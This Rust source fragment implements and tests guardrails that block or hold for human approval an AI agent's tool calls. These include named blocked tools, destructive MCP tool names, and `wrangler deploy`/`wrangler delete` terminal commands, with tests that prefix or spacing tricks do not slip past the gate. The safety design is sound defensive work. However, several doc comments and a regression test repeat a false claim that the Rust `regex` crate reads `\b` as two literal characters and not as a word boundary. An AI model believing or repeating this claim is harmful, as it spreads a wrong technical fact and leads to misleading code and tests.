        assert_eq!(
            guardrail.check("terminal", &json_null()),
            GuardrailDecision::Allow
        );
        assert_eq!(
            guardrail.check("write_file", &json_null()),
            GuardrailDecision::Allow
        );
        assert_eq!(
            guardrail.check("any_tool", &json_null()),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn test_format_guardrail_error_full() {
        let msg = format_guardrail_error(
            "terminal",
            "on the blocklist",
            "blocklist",
            &ErrorDetailLevel::Full,
        );
        assert!(
            msg.contains("terminal"),
            "expected tool name in full message: {msg}"
        );
        assert!(
            msg.contains("on the blocklist"),
            "expected reason in full message: {msg}"
        );
        assert!(
            msg.contains("blocklist"),
            "expected guardrail name in full message: {msg}"
        );
        assert!(
            msg.contains("It did not run."),
            "expected the did-not-run statement: {msg}"
        );
        assert!(
            msg.ends_with(crate::refusal::NO_CIRCUMVENTION_NOTICE),
            "expected the no-circumvention notice at the end: {msg}"
        );
    }

    #[test]
    fn test_format_guardrail_error_minimal() {
        let msg = format_guardrail_error(
            "terminal",
            "on the blocklist",
            "blocklist",
            &ErrorDetailLevel::Minimal,
        );
        assert_eq!(
            msg,
            format!(
                "Tool call blocked by security policy. It did not run. {}",
                crate::refusal::NO_CIRCUMVENTION_NOTICE
            )
        );
        assert!(
            !msg.contains("terminal"),
            "tool name must not appear in minimal message: {msg}"
        );
    }

    #[test]
    fn test_guardrail_decision_warn() {
        let warn = GuardrailDecision::Warn {
            reason: "suspicious args".to_string(),
        };
        assert!(!matches!(warn, GuardrailDecision::Block { .. }));
        assert!(!matches!(warn, GuardrailDecision::Allow));
        assert!(matches!(warn, GuardrailDecision::Warn { .. }));
    }

    #[test]
    fn test_blocklist_from_config() {
        let config = HooksConfig {
            blocked_tools: vec!["terminal".to_string(), "write_file".to_string()],
            ..HooksConfig::default()
        };
        let guardrail = BlocklistGuardrail::from_config(&config);
        assert!(matches!(
            guardrail.check("terminal", &json_null()),
            GuardrailDecision::Block { .. }
        ));
        assert!(matches!(
            guardrail.check("write_file", &json_null()),
            GuardrailDecision::Block { .. }
        ));
        assert_eq!(
            guardrail.check("read_file", &json_null()),
            GuardrailDecision::Allow
        );
    }
}

/// Guardrail that intercepts LLM-issued `terminal` tool calls running
/// `wrangler deploy` or `wrangler delete`.
///
/// Phase 46 D-06: today an LLM-issued `wrangler deploy`/`wrangler delete` executes with
/// no approval prompt and no audit entry — `DangerousCommandGuardrail`'s `Warn` decision
/// is auto-`Allow` on the LLM tool-call path (agent_loop.rs groups `Allow | Warn` into
/// execute-immediately). This guardrail mirrors [`McpMutationGuardrail`] structurally but
/// targets the `terminal` tool's `command` argument instead of MCP tool names, and always
/// returns [`GuardrailDecision::NeedsApproval`] — **never** `Warn` — so the deploy/delete
/// path is forced through the Phase 45 approval gate + Phase 46 audit before any subprocess
/// runs.
///
/// Scoped to `wrangler deploy`/`wrangler delete` only (D-07's UAT target). Broader
/// wrangler-subcommand coverage (kv/r2/d1 delete) is a documented v1.1 follow-up.
///
/// **NEVER use `\b`** — the Rust `regex` crate treats `\b` as two literal chars, not a
/// word-boundary assertion (T-45-03 precedent). Negative-character-class boundaries are
/// used instead so evasions like double-space, leading command prefix (`npx wrangler
/// deploy`), or trailing args cannot slip past the gate.
pub struct WranglerMutationGuardrail {
    pattern: Regex,
}

impl WranglerMutationGuardrail {
    /// Create a guardrail with the built-in wrangler deploy/delete pattern compiled once.
    pub fn new() -> Self {
        let pattern =
            Regex::new(r"(?:^|[^a-zA-Z0-9_])wrangler\s+(?:deploy|delete)(?:[^a-zA-Z0-9_]|$)")
                .expect("WranglerMutationGuardrail: invalid built-in pattern");
        Self { pattern }
    }
}

impl Default for WranglerMutationGuardrail {
    fn default() -> Self {
        Self::new()
    }
}

impl GuardrailHook for WranglerMutationGuardrail {
    /// Classify a tool call before dispatch.
    ///
    /// - Non-`terminal` tool → [`GuardrailDecision::Allow`] (only gates the terminal tool).
    /// - `terminal` call with no `command` argument → [`GuardrailDecision::Allow`].
    /// - `terminal` call whose `command` matches `wrangler deploy`/`wrangler delete` →
    ///   [`GuardrailDecision::NeedsApproval`] (D-11).
    /// - Any other `terminal` command → [`GuardrailDecision::Allow`].
    fn check(&self, tool_name: &str, args: &serde_json::Value) -> GuardrailDecision {
        if tool_name != "terminal" {
            return GuardrailDecision::Allow;
        }
        let Some(command) = args.get("command").and_then(|v| v.as_str()) else {
            return GuardrailDecision::Allow;
        };
        if self.pattern.is_match(command) {
            return GuardrailDecision::NeedsApproval {
                reason: format!(
                    "wrangler destructive/deploy command — approval required: {command}"
                ),
            };
        }
        GuardrailDecision::Allow
    }

    fn name(&self) -> &str {
        "wrangler-mutation"
    }
}

// ---------------------------------------------------------------------------
// Tests — McpMutationGuardrail (EXEC-05-a..d)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod guardrail_mcp_tests {
    use super::{DEFAULT_VERBS, GuardrailDecision, GuardrailHook, McpMutationGuardrail};

    /// EXEC-05-a: destructive prefixed MCP tool → NeedsApproval.
    #[test]
    fn mcp_mutation_guardrail() {
        let g = McpMutationGuardrail::new();
        let decision = g.check(
            "cloudflare_bindings__kv_bulk_delete",
            &serde_json::Value::Null,
        );
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "destructive MCP tool must NeedsApproval, got: {decision:?}"
        );
    }

    /// EXEC-05-b: local tool without `__` → Allow.
    #[test]
    fn mcp_mutation_allow_local() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("terminal", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "local tool must Allow, got: {decision:?}"
        );
    }

    /// EXEC-05-c: read-only prefixed MCP tool → Allow.
    #[test]
    fn mcp_mutation_allow_read() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("cloudflare_bindings__kv_get", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "read-only MCP tool must Allow, got: {decision:?}"
        );
    }

    /// EXEC-05-d: no DEFAULT_VERB pattern contains the Rust-regex word-boundary literal.
    ///
    /// The `regex` crate treats `\b` as two literal characters (backslash + b), NOT a
    /// word-boundary assertion. Using it would silently fail to match (T-45-03).
    #[test]
    fn regex_no_word_boundary() {
        let g = McpMutationGuardrail::new();
        for pattern in &g.patterns {
            let src = pattern.as_str();
            assert!(
                !src.contains("\\b"),
                "pattern contains the Rust-regex word-boundary literal \\b (T-45-03): {src}"
            );
        }
        // Also assert DEFAULT_VERBS drives the pattern count
        assert_eq!(
            g.patterns.len(),
            DEFAULT_VERBS.len(),
            "pattern count must match DEFAULT_VERBS length"
        );
    }

    /// LO-02: a destructive verb in a NON-final `__` segment must still be caught.
    ///
    /// The old code used `rsplit("__").next()` (final segment only), so
    /// `srv__delete__wrapper` was checked against `"wrapper"` and slipped through.
    /// The fix matches the whole remainder after the FIRST `__`
    /// (`splitn(2, "__").nth(1)` → `"delete__wrapper"`), catching the verb.
    #[test]
    fn mcp_mutation_verb_in_nonfinal_segment() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("srv__delete__wrapper", &serde_json::Value::Null);
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "LO-02: destructive verb in a non-final __ segment must NeedsApproval, got: {decision:?}"
        );
    }

    // -----------------------------------------------------------------
    // Phase 54 Plan 04 (D-16b): pin McpMutationGuardrail's decision boundary
    // in both directions and prove it selective.
    // -----------------------------------------------------------------

    /// Table-driven over the REAL `DEFAULT_VERBS` constant (not hardcoded
    /// strings), so the test tracks the set rather than a snapshot of it.
    /// At least three distinct destructive verbs each independently trigger
    /// NeedsApproval on a server-prefixed name.
    #[test]
    fn mcp_mutation_fires_on_prefixed_destructive_verb() {
        let g = McpMutationGuardrail::new();
        assert!(
            DEFAULT_VERBS.len() >= 3,
            "test needs at least three default verbs so it is not accidentally \
             specific to one"
        );
        for verb in DEFAULT_VERBS.iter().take(3) {
            let tool_name = format!("some_server__{verb}_resource");
            let decision = g.check(&tool_name, &serde_json::Value::Null);
            assert!(
                matches!(decision, GuardrailDecision::NeedsApproval { .. }),
                "verb '{verb}' on a prefixed name must NeedsApproval, got: \
                 {decision:?} (tool_name={tool_name})"
            );
        }
    }

    /// A name with NO server separator is NEVER intercepted by
    /// `McpMutationGuardrail` — local tools are gated by the separate
    /// `DangerousCommandGuardrail` (plan 01's Python branch and the existing
    /// shell-syntax tables), not this guardrail. This is the correct division
    /// of labor, not a gap: a reader who saw this test without this note
    /// would reasonably mistake it for a hole.
    #[test]
    fn mcp_mutation_allows_unprefixed_local_tool_name() {
        let g = McpMutationGuardrail::new();
        // Bare built-in tool name.
        let decision = g.check("terminal", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "bare built-in tool name must Allow under McpMutationGuardrail \
             (DangerousCommandGuardrail is the control for local tools), got: \
             {decision:?}"
        );
        // Bare name that LOOKS destructive (contains a default verb) but has
        // no server separator — still Allow under THIS guardrail.
        let decision = g.check("delete_all_files", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "unprefixed name containing a destructive verb must still Allow \
             under McpMutationGuardrail — DangerousCommandGuardrail is the \
             control that gates local tools, not this one; got: {decision:?}"
        );
    }

    /// Selectivity companion: a prefixed MCP tool name whose verb portion is
    /// NOT in the destructive set must Allow. Without this, a guardrail that
    /// returned NeedsApproval for every prefixed name would also pass the
    /// destructive-verb test above.
    #[test]
    fn mcp_mutation_allows_prefixed_non_destructive_verb() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("some_server__list_resources", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "prefixed name with a non-destructive verb must Allow, got: {decision:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// Tests — WranglerMutationGuardrail (Phase 46, D-06/D-07)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod wrangler_mutation_tests {
    use super::{GuardrailDecision, GuardrailHook, WranglerMutationGuardrail};

    fn command_args(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    #[test]
    fn wrangler_deploy_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler deploy"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "wrangler deploy must NeedsApproval, got: {decision:?}"
        );
    }

    #[test]
    fn wrangler_delete_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler delete my-worker"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "wrangler delete must NeedsApproval, got: {decision:?}"
        );
    }

    /// Leading command prefix (e.g. `npx wrangler deploy`) must not evade the gate.
    #[test]
    fn npx_wrangler_deploy_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("npx wrangler deploy"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "npx wrangler deploy must NeedsApproval (leading prefix must not evade), got: {decision:?}"
        );
    }

    /// Double-space between `wrangler` and `deploy` must not evade the gate.
    #[test]
    fn double_space_wrangler_deploy_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler  deploy"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "wrangler  deploy (double space) must NeedsApproval, got: {decision:?}"
        );
    }

    #[test]
    fn wrangler_tail_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler tail"));
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "wrangler tail is non-destructive, must Allow, got: {decision:?}"
        );
    }

    #[test]
    fn wrangler_whoami_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler whoami"));
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "wrangler whoami is non-destructive, must Allow, got: {decision:?}"
        );
    }

    /// Only the `terminal` tool is gated — other tool names always Allow.
    #[test]
    fn non_terminal_tool_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("some_other_tool", &command_args("wrangler deploy"));
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "non-terminal tool must Allow regardless of command, got: {decision:?}"
        );
    }

    #[test]
    fn missing_command_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "missing command key must Allow, got: {decision:?}"
        );
        let decision_empty_obj = g.check("terminal", &serde_json::json!({}));
        assert_eq!(
            decision_empty_obj,
            GuardrailDecision::Allow,
            "empty args object must Allow, got: {decision_empty_obj:?}"
        );
    }

    /// T-45-03 regression guard: the pattern must never contain the Rust-regex
    /// word-boundary literal `\b` (two literal chars in the `regex` crate, not an
    /// assertion) — negative-character-class boundaries only.
    #[test]
    fn regex_no_word_boundary() {
        let g = WranglerMutationGuardrail::new();
        let src = g.pattern.as_str();
        assert!(
            !src.contains("\\b"),
            "pattern contains the Rust-regex word-boundary literal \\b (T-45-03): {src}"
        );
    }

    #[test]
    fn name_is_wrangler_mutation() {
        let g = WranglerMutationGuardrail::new();
        assert_eq!(g.name(), "wrangler-mutation");
    }
}
